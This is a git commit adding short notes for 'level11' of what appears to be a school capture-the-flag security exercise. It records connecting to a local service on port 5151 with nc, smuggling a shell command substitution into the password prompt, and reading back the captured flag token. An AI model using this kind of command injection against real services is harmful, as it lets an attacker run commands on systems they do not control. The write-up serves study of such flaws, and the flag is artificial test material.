98fa74f5dc63aead01ef7b2e2cd22e8f17b3375a
Arthur Bourbousson <abourbou@z3r7p1.42lyon.fr>
2022-03-30 16:03:02 +0200

    level11

---
+++ level11/Ressources/script.sh
@@ -0,0 +1,11 @@
+#.lua file
+> try to create server on port 5151 but it is already in use
+
+cat /etc/services | grep 5151
+> pcrd		5151		# PCR-1000 Deamon
+
+#nc 127.0.0.1 5151
+> password: "$(getflag > /tmp/file)"
+
+cat /tmp/file
+> fa6v5ateaw21peobuub8ipe6s
